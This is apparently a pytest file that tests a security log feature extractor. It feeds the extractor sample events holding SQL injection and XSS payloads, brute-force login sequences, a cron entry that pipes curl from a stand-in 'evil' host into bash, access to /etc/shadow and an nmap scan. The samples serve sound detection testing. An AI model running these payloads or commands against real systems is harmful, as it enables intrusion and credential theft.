import pytest


def test_apache_sqli_and_urlencoded_and_xss_and_bruteforce():
    from app.feature_extractors.apache import ApacheFeatureExtractor

    ext = ApacheFeatureExtractor()
    events = [
        {"event_type": "http_request", "ip": "203.0.113.45", "metadata": {"path": "GET /?id=1' OR '1'='1", "status_code": "200"}, "raw": "GET /?id=1' OR '1'='1"},
        {"event_type": "http_request", "ip": "203.0.113.45", "metadata": {"path": "GET /?id=1 UNION SELECT username,password FROM users", "status_code": "200"}, "raw": "GET /?id=1 UNION SELECT username,password FROM users"},
        {"event_type": "http_request", "ip": "198.51.100.21", "metadata": {"path": "GET /search?q=alert('xss')", "status_code": "200"}, "raw": "GET /search?q=<script>alert('xss')</script>"},
        # brute force: five 401s then a 200
        {"event_type": "http_request", "ip": "198.51.100.30", "metadata": {"path": "/login", "status_code": "401"}},
        {"event_type": "http_request", "ip": "198.51.100.30", "metadata": {"path": "/login", "status_code": "401"}},
        {"event_type": "http_request", "ip": "198.51.100.30", "metadata": {"path": "/login", "status_code": "401"}},
        {"event_type": "http_request", "ip": "198.51.100.30", "metadata": {"path": "/login", "status_code": "401"}},
        {"event_type": "http_request", "ip": "198.51.100.30", "metadata": {"path": "/login", "status_code": "401"}},
        {"event_type": "http_request", "ip": "198.51.100.30", "metadata": {"path": "/login", "status_code": "200"}},
        # URL-encoded SQLi
        {"event_type": "http_request", "ip": "198.51.100.50", "metadata": {"path": "/api/user?id=1%20OR%201=1", "status_code": "200"}, "raw": "/api/user?id=1%20OR%201=1"},
        {"event_type": "http_request", "ip": "198.51.100.50", "metadata": {"path": "/api/user?id=1%20UNION%20SELECT%20password%20FROM%20users", "status_code": "200"}, "raw": "/api/user?id=1%20UNION%20SELECT%20password%20FROM%20users"},
    ]

    feats = ext.extract(events)
    by_ip = {f["source_ip"]: f for f in feats}

    assert by_ip["203.0.113.45"]["sqli_attempt_count"] >= 2
    assert by_ip["198.51.100.21"]["xss_attempt_count"] >= 1
    assert by_ip["198.51.100.30"]["failed_login_count"] == 5
    assert by_ip["198.51.100.30"]["brute_force_attempt_count"] == 5
    assert by_ip["198.51.100.50"]["sqli_attempt_count"] >= 2


def test_apache_sqli_query_string_detection():
    from app.feature_extractors.apache import ApacheFeatureExtractor

    ext = ApacheFeatureExtractor()
    events = [
        {"event_type": "http_request", "ip": "203.0.113.45", "metadata": {"path": "GET /?id=1' OR '1'='1", "status_code": "200"}, "raw": "GET /?id=1' OR '1'='1"},
        {"event_type": "http_request", "ip": "203.0.113.45", "metadata": {"path": "GET /?id=1 UNION SELECT username,password FROM users", "status_code": "200"}, "raw": "GET /?id=1 UNION SELECT username,password FROM users"},
    ]

    feats = ext.extract(events)
    by_ip = {f["source_ip"]: f for f in feats}

    assert by_ip["203.0.113.45"]["sqli_attempt_count"] == 2


def test_syslog_service_failure_and_cron_once():
    from app.feature_extractors.syslog import SyslogFeatureExtractor

    ext = SyslogFeatureExtractor()
    events = [
        {"event_type": "syslog_event", "ip": "203.0.113.50", "metadata": {"message": "Failed password for invalid user"}},
        {"event_type": "syslog_event", "ip": "203.0.113.50", "metadata": {"message": "sshd[1]: Failed with result 'exit-code'"}},
        # cron executed once; ensure counted once
        {"event_type": "syslog_event", "ip": "unknown", "metadata": {"message": "CRON: (root) CMD (/usr/bin/curl http://evil/payload.sh | bash)"}},
        {"event_type": "syslog_event", "ip": "unknown", "metadata": {"message": "CRON: (root) CMD (/usr/bin/curl http://evil/payload.sh | bash)"}},
    ]

    feats = ext.extract(events)
    by_ip = {f["source_ip"]: f for f in feats}

    # service failure should be counted only for service line, not failed password
    assert by_ip["203.0.113.50"]["service_failure_count"] == 1
    # cron counted once for unknown
    assert by_ip["unknown"]["suspicious_cron_count"] == 1


def test_json_sensitive_recon_critical():
    from app.feature_extractors.json_extractor import JsonFeatureExtractor

    ext = JsonFeatureExtractor()
    events = [
        {"event_type": "file_access", "ip": "unknown", "metadata": {"file": "/etc/shadow"}},
        {"event_type": "command_execution", "ip": "unknown", "metadata": {"command": "nmap -sV 10.0.0.0/24"}},
        {"event_type": "file_modification", "ip": "unknown", "metadata": {"file": "/etc/passwd"}},
    ]

    feats = ext.extract(events)
    by_ip = {f["source_ip"]: f for f in feats}
    f = by_ip.get("unknown")
    assert f is not None
    assert f.get("sensitive_file_access_count", 0) >= 1
    assert f.get("reconnaissance_count", 0) >= 1
    assert f.get("critical_file_modification_count", 0) >= 1
